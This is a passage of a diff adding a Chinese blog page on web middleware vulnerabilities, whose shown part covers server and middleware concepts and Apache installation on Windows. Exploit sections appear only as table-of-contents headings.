@@ -1,0 +1,1005 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    中间件及漏洞 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="所谓的中间件漏洞就是并非是由于代码程序上设计存在缺陷而导致的漏洞，而是属于应用部署中环境配置不当或使用不当而导致的漏洞，同时这方面的漏洞也是最容易被管理员忽略的一部分。 中间件通常包括六大类：Web 服务器、Servlet 容器 &#x2F; 应用服务器、缓存、消息队列 &#x2F; 事件流、API 网关 &#x2F; 反向代理、搜索 &#x2F; 分析中间件  服务器、中间件、容器基本概念 web服务器：web服务器用于提供http服">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件及漏洞">
+<meta property="og:url" content="http://example.com/2026/03/25/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="所谓的中间件漏洞就是并非是由于代码程序上设计存在缺陷而导致的漏洞，而是属于应用部署中环境配置不当或使用不当而导致的漏洞，同时这方面的漏洞也是最容易被管理员忽略的一部分。 中间件通常包括六大类：Web 服务器、Servlet 容器 &#x2F; 应用服务器、缓存、消息队列 &#x2F; 事件流、API 网关 &#x2F; 反向代理、搜索 &#x2F; 分析中间件  服务器、中间件、容器基本概念 web服务器：web服务器用于提供http服">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/25/images/1511943-20190621161852460-1740434456.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/1511943-20190621163409662-864882995.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/1511943-20190621164830072-21871650.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325200319187.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325201012533.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325201025566.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/v2-b8ee8bcc7bb5400a0532ef62467bc006_1440w.webp">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325203932942.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325203947841.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/v2-2f738eae2fdf256538ccdfb7bf323bae_1440w.webp">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325202518040.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325202553079.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325205154576.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325205255391.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/6e0f2fb5f62404a681b300fb189355cb.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/4e92f53d5a80901c679d364dc595fdd5.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/5855182364067fc468384b8704a1d2b6.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/e31dc0fd122742921c7c0325cb871888.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/db28febcb43ee0dbea016e9c22ebbc80.png">
+<meta property="og:image" content="http://example.com/2026/03/25/images/image-20260325210806601.png">
+<meta property="article:published_time" content="2026-03-25T11:33:12.000Z">
+<meta property="article:modified_time" content="2026-03-25T13:28:35.221Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="中间件">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/25/images/1511943-20190621161852460-1740434456.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="中间件及漏洞">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">中间件及漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E5%AE%B9%E5%99%A8%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> 服务器、中间件、容器基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache"><span class="toc-number">2.</span> <span class="toc-text"> Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.</span> <span class="toc-text"> 安装及部署</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85apache%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 安装Apache服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Ecve-2017-15715"><span class="toc-number">2.2.</span> <span class="toc-text"> Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Eapache_parsing_vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text"> Apache多后缀解析漏洞（apache_parsing_vulnerability）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-http-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2021-41773"><span class="toc-number">2.4.</span> <span class="toc-text"> Apache HTTP 路径穿越漏洞（CVE-2021-41773）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-3"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-http-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2021-42013"><span class="toc-number">2.5.</span> <span class="toc-text"> Apache HTTP 路径穿越漏洞（CVE-2021-42013）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="toc-number">2.5.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text"> Apache SSI 远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-4"><span class="toc-number">2.6.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="toc-number">2.6.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx"><span class="toc-number">3.</span> <span class="toc-text"> Nginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text"> CRLF注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-6"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text"> 目录穿越漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-7"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add_header%E8%A2%AB%E8%A6%86%E7%9B%96"><span class="toc-number">3.4.</span> <span class="toc-text"> add_header被覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-number">3.4.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-8"><span class="toc-number">3.4.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text"> 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-5"><span class="toc-number">3.5.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-9"><span class="toc-number">3.5.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iis"><span class="toc-number">4.</span> <span class="toc-text"> IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-3"><span class="toc-number">4.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis60-put%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text"> IIS6.0 PUT漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-6"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-10"><span class="toc-number">4.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E7%8C%9C%E8%A7%A3"><span class="toc-number">4.3.</span> <span class="toc-text"> 短文件名猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-number">4.3.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-11"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis6-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text"> IIS6 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-6"><span class="toc-number">4.4.1.</span> <span class="toc-text"> 漏洞简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis7-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.5.</span> <span class="toc-text"> IIS7 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-7"><span class="toc-number">4.5.1.</span> <span class="toc-text"> 漏洞简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpsyscve-2015-1635%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BD%9C%E8%93%9D%E5%B1%8F%E7%A0%B4%E5%9D%8F%E8%B7%9F%E6%9D%83%E9%99%90%E4%B8%8D%E6%8C%82%E9%92%A9"><span class="toc-number">4.6.</span> <span class="toc-text"> HTTP.SYS（CVE-2015-1635）主要用作蓝屏破坏，跟权限不挂钩</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-8"><span class="toc-number">4.6.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-12"><span class="toc-number">4.6.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caddy"><span class="toc-number">5.</span> <span class="toc-text"> Caddy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-4"><span class="toc-number">5.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text"> 基本语法</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-中间件及漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/03/25/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-25T11:33:12.000Z" itemprop="datePublished">2026-03-25</time>
+    <time style="display: none;" id="post-update-time">2026-03-25</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>所谓的中间件漏洞就是并非是由于代码程序上设计存在缺陷而导致的漏洞，而是属于应用部署中环境配置不当或使用不当而导致的漏洞，同时这方面的漏洞也是最容易被管理员忽略的一部分。</p>
+<p>中间件通常包括六大类：<strong>Web 服务器、Servlet 容器 / 应用服务器、缓存、消息队列 / 事件流、API 网关 / 反向代理、搜索 / 分析中间件</strong></p>
+<h2 id="服务器-中间件-容器基本概念"><a class="markdownIt-Anchor" href="#服务器-中间件-容器基本概念"></a> <strong>服务器、中间件、容器基本概念</strong></h2>
+<p><strong>web服务器</strong>：web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。</p>
+<p><strong>web中间件</strong>：web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。</p>
+<p><strong>web容器</strong>：web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。</p>
+<p><strong>常见的组件：</strong></p>
+<p><strong>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。</strong></p>
+<p><strong>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。</strong></p>
+<p><strong>web容器：JSP容器、SERVLET容器、ASP容器等。</strong></p>
+<h2 id="apache"><a class="markdownIt-Anchor" href="#apache"></a> Apache</h2>
+<p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将python等解释器编译到服务器中。</p>
+<h3 id="安装及部署"><a class="markdownIt-Anchor" href="#安装及部署"></a> 安装及部署</h3>
+<h4 id="下载"><a class="markdownIt-Anchor" href="#下载"></a> 下载</h4>
+<p>进入apache服务器官网 <a target="_blank" rel="noopener" href="http://httpd.apache.org/">http://httpd.apache.org/</a> 这里我们以下载稳定版的</p>
+<p>Apache httpd 2.4.39 Released 为例，点击download。</p>
+<p><img src="../images/1511943-20190621161852460-1740434456.png" alt="download" /></p>
+<p>下载后解压，改名为httpd，放到D盘根目录。</p>
+<p><img src="../images/1511943-20190621163409662-864882995.png" alt="Apache目录" /></p>
+<p>Apache各目录作用：</p>
+<table>
+<thead>
+<tr>
+<th>目录名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bin</td>
+<td>Apache执行文件所在目录，如httpd.exe、ApacheMonitor.exe 等</td>
+</tr>
+<tr>
+<td>cgi-bin</td>
+<td>GCI网页程序存放目录</td>
+</tr>
+<tr>
+<td>conf</td>
+<td>Apache服务器配置文件所在目录</td>
+</tr>
+<tr>
+<td>error</td>
+<td>错误文件目录，用于保存因服务器设置或浏览器请求的数据错误时产生的错误</td>
+</tr>
+<tr>
+<td>htdocs</td>
+<td>默认Web文档根目录，就是存放默认首页的位置</td>
+</tr>
+<tr>
+<td>icons</td>
+<td>Apache预设的一些小图标存放目录</td>
+</tr>
+<tr>
+<td>include</td>
+<td></td>
+</tr>
+<tr>
+<td>lib</td>
+<td></td>
+</tr>
+<tr>
+<td>logs</td>
+<td>Apache 日志文件存放目录，主要包括访问日志 access.log 和错误日志 error.log</td>
+</tr>
+<tr>
+<td>modules</td>
+<td>Apache服务器支持的动态加载模块所在目录</td>
+</tr>
+</tbody>
+</table>
+<h4 id="安装apache服务"><a class="markdownIt-Anchor" href="#安装apache服务"></a> 安装Apache服务</h4>
+<p>使用管理员身份运行cmd，命令行下进入到 Apache 下面的 bin 目录，输入</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -k <span class="keyword">install</span></span><br></pre></td></tr></table></figure>
+<p>把apache安装成windows后台服务。</p>
+<p>命令启动Apache服务：<code>httpd -k start</code></p>
+<p><code>httpd -k stop</code> 停止</p>
+<p><code>httpd -k restart</code> 重启</p>
+<blockquote>
+<p>问题及解决：如果出现以下错误<br />
+<img src="../images/1511943-20190621164830072-21871650.png" alt="img" /></p>
+<p>【原因】<br />
+httpd.conf 里面配置的 ServerRoot 路径跟实际路径不一致，导致路径无效。</p>
+<p>【解决方案】<br />
+修改 D:\httpd\Apache24\conf 目录下的 httpd.conf 文件，在38行左右</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Define SRVROOT <span class="string">&quot;D:/httpd/Apache24&quot;</span></span><br><span class="line">ServerRoot <span class="string">&quot;<span class="variable">$&#123;SRVROOT&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>注意路径是 “<code>/</code>”不是“<code>\</code>”</p>
+</blockquote>
+<h4 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h4>
+<p>关键设置：</p>
+<ul>
+<li><code>Listen 80</code>（监听80端口）</li>
+<li><code>DocumentRoot</code>（网站文件存放位置）</li>
